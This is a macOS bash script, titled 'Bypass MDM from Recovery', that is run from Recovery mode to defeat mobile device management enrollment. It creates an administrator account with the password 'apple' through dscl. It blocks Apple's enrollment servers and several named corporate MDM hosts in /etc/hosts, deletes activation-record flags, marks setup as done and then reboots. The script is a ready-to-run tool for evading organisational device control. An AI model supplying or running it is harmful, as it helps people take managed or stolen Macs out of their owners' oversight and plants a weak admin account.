#!/bin/bash

# Define color codes
RED='\033[1;31m'
GRN='\033[1;32m'
BLU='\033[1;34m'
YEL='\033[1;33m'
PUR='\033[1;35m'
CYAN='\033[1;36m'
NC='\033[0m'

echo -e "${YEL}Bypass MDM from Recovery${NC}"

echo -e "${BLU}Fetching System Volume name${NC}"
system_volume=$(diskutil info / | grep  "Volume Name" | awk -F': ' '{print $2}' | xargs) # Returns something like: "Macintosh HD"
echo -e "${GRN}$system_volume${NC}"   

if [ -d "/Volumes/$system_volume - Data" ]; then
    echo -e "${BLU}Renaming '$system_volume - Data' to 'Data'${NC}"
    diskutil rename "$system_volume - Data" "Data"
fi

echo -e "${BLU}Creating Temporary User${NC}"
real_name="apple"
username="apple"
password="apple"

dscl_path='/Volumes/Data/private/var/db/dslocal/nodes/Default'
users_path='/Local/Default/Users'
groups_path='/Local/Default/Groups'

echo -e "${GRN}Password: $password${NC}"
dscl -f "$dscl_path" localhost -create "$users_path/$username"
dscl -f "$dscl_path" localhost -create "$users_path/$username" UserShell "/bin/zsh"
dscl -f "$dscl_path" localhost -create "$users_path/$username" RealName "$real_name"
dscl -f "$dscl_path" localhost -create "$users_path/$username" UniqueID "501"
dscl -f "$dscl_path" localhost -create "$users_path/$username" PrimaryGroupID "20"
mkdir -p "/Volumes/Data/Users/$username"
dscl -f "$dscl_path" localhost -create "$users_path/$username" NFSHomeDirectory "/Users/$username"
dscl -f "$dscl_path" localhost -passwd "$users_path/$username" "$password"
dscl -f "$dscl_path" localhost -append "$groups_path/admin" GroupMembership "$username"

echo -e "${BLU}Blocking MDM domains${NC}"
mdm_domains=( 
  "deviceenrollment.apple.com"  "mdmenrollment.apple.com"  "iprofiles.apple.com"  "gdmf.apple.com"  "acmdm.apple.com"
  "albert.apple.com"  "mdm.apple.com"  "mdmenroll.apple.com"  "mdmcheckin.apple.com"  "school.apple.com"
  "mdm.amazon.com"  "deviceenrollment.amazon.com"  "dexcom.okta.com"  "dexcom.jamfcloud.com"
)
for domain in "${mdm_domains[@]}"; do
  echo "0.0.0.0 $domain" >> /Volumes/"$system_volume"/etc/hosts
done
echo -e "${GRN}Successfully blocked MDM & Profile Domains${NC}"

echo -e "${BLU}Removing configuration profiles${NC}"
touch /Volumes/Data/private/var/db/.AppleSetupDone
confprofile_path="/Volumes/$system_volume/var/db/ConfigurationProfiles/Settings"
rm -rf $confprofile_path/.cloudConfigHasActivationRecord
rm -rf $confprofile_path/.cloudConfigRecordFound
touch $confprofile_path/.cloudConfigProfileInstalled
touch $confprofile_path/.cloudConfigRecordNotFound

echo -e "${GRN}MDM enrollment has been bypassed!${NC}"
echo -e "${NC}Rebooting your Mac...${NC}"

sleep 2
reboot
